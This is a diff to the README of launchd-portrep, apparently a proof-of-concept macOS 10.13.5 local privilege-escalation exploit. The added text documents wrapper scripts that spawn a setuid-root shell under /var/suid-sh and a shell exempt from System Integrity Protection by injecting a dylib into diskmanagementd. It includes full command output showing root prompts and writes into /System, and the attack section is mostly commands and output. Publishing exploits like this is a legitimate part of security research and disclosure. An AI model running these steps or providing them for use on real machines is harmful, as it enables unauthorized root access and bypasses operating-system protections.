@@ -181,7 +181,10 @@ first.
 	$ make
 
 Note that the exploit as written will fail if the sysdiagnose process is already running. Thus, for
-the purposes of this proof of concept, be sure to kill sysdiagnose before running the exploit.
+the purposes of this proof of concept, be sure to kill sysdiagnose before running the exploit. (It
+is possible to rework the exploit so that it still works if sysdiagnose is already running, but I
+have decided not to incorporate this functionality in order to dissuade the use of this tool for
+malicious purposes.)
 
 Run the exploit by specifying the command to run as if it were being given to the `system()`
 function:
@@ -195,14 +198,62 @@ function:
 	$ ls -la /tmp/exploit-success
 	-rw-r--r--  1 root  wheel  0 Jul 24 23:50 /tmp/exploit-success
 
-There is also an example script `launchd-portrep-rootsh.sh` that will use launchd-portrep to
-install a setuid-root shell launcher under `/var/suid-sh`. Any user that runs this binary will be
-presented with a root shell. You should probably ensure this file is removed when done. :)
+Alternatively, if you specify a PID and an absolute path to a dynamic library file,
+`launchd-portrep` will inject the dylib into the specified process.
 
-Alternatively, specify the PID of the process you want to inject into and the path to the dylib to
-inject:
+There are also two example scripts that wrap `launchd-portrep`: `launchd-portrep-rootsh.sh` and
+`launchd-portrep-rootless.sh`.
 
-	$ ./launchd-portrep 450 $PWD/inject.dylib
+`launchd-portrep-rootsh.sh` will present a traditional root shell by installing a setuid-root shell
+launcher under `/var/suid-sh`. (The setuid shell is automatically removed after 1 second.)
+
+	$ bash ./launchd-portrep-rootsh.sh
+	[+] Freed launchd service port for com.apple.CoreServices.coreservicesd
+	[+] Replaced com.apple.CoreServices.coreservicesd with replacer port 0x153b (index 192) after 60 tries
+	[+] Sysdiagnose has PID 1231
+	[+] Found sysdiagnose task port 0x1df7b
+	[+] Command exited with status: 0
+	Launching /private/var/suid-sh
+	bash-3.2#
+
+`launchd-portrep-rootless.sh` is even more interesting: it presents a shell where rootless
+restrictions on the filesystem have been disabled. It does this by spawning diskmanagementd, which
+has the `com.apple.rootless.install.heritable` entitlement, and then injecting a dylib into
+diskmanagementd that causes it to spawn a shell with stdin and stdout bound to named pipes. As the
+name of the entitlement suggests, the exemptions from SIP granted by
+`com.apple.rootless.install.heritable` will be passed down to the child processes, meaning that the
+shell and all commands you run in it are essentially exempt from the SIP filesystem protections.
+
+	$ bash ./launchd-portrep-rootless.sh
+	[+] Freed launchd service port for com.apple.CoreServices.coreservicesd
+	[+] Replaced com.apple.CoreServices.coreservicesd with replacer port 0xe7b (index 194) after 60 tries
+	[+] Sysdiagnose has PID 1145
+	[+] Found sysdiagnose task port 0x1747b
+	[+] Command exited with status: 0
+	[+] Freed launchd service port for com.apple.CoreServices.coreservicesd
+	[+] Replaced com.apple.CoreServices.coreservicesd with replacer port 0x13d7b (index 199) after 61 tries
+	[+] Sysdiagnose has PID 1162
+	[+] Found sysdiagnose task port 0xbe47
+	[+] Got task port 0xa07 for PID 1153
+	[+] Successfully loaded "/Users/bazad/Developer/GitHub/launchd-portrep/rootless-sh.dylib" in process 1153
+	bash: no job control in this shell
+	bash-3.2# csrutil status
+	System Integrity Protection status: enabled.
+	bash-3.2# ls -laO /System
+	total 0
+	drwxr-xr-x@   4 root  wheel  restricted  128 Jul 25 19:08 .
+	drwxr-xr-x   31 root  wheel  sunlnk      992 Jul 25 12:20 ..
+	-rw-r--r--    1 root  wheel  restricted    0 Oct  6  2017 .localized
+	drwxr-xr-x  102 root  wheel  restricted 3264 Jun 12 11:47 Library
+	bash-3.2# touch /System/exploit-success
+	bash-3.2# ls -laO /System
+	total 0
+	drwxr-xr-x@   5 root  wheel  restricted  160 Jul 25 19:19 .
+	drwxr-xr-x   31 root  wheel  sunlnk      992 Jul 25 12:20 ..
+	-rw-r--r--    1 root  wheel  restricted    0 Oct  6  2017 .localized
+	drwxr-xr-x  102 root  wheel  restricted 3264 Jun 12 11:47 Library
+	-rw-r--r--    1 root  wheel  restricted    0 Jul 25 19:19 exploit-success
+	bash-3.2# exit
 
 launchd-portrep has been tested on macOS 10.13.5 17F77.
 
